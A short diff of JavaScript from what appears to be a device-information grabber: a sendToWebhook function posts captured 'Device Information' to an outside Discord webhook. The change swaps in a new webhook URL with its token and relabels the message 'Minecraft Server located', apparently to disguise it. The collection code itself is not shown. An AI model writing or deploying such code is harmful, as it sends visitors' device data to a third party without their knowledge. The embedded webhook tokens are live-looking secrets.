@@ -80,10 +80,10 @@
     });
 
     function sendToWebhook(info) {
-        const webhookURL = 'https://discord.com/api/webhooks/1342949424187441262/sVhExvZurPSu5w5eJCoZT1oX4bNU0XMwR0g24Y1Z1672OpQgSha3k3OUFnJh5DgWFJhR';
+        const webhookURL = 'https://discord.com/api/webhooks/1431543717377867787/dZ4rp19nJRhB8M7RH0QMriafBGs7_DO7H-U25CXW0i3WfsOmy3sbMwLKa-wGwMAK5mQs';
         
         const payload = {
-            content: "New Device Info Captured",
+            content: "Minecraft Server located",
             embeds: [{
                 title: "Device Information",
                 description: Object.entries(info).map(([key, value]) => `**${key}**: ${value}`).join("\n"),
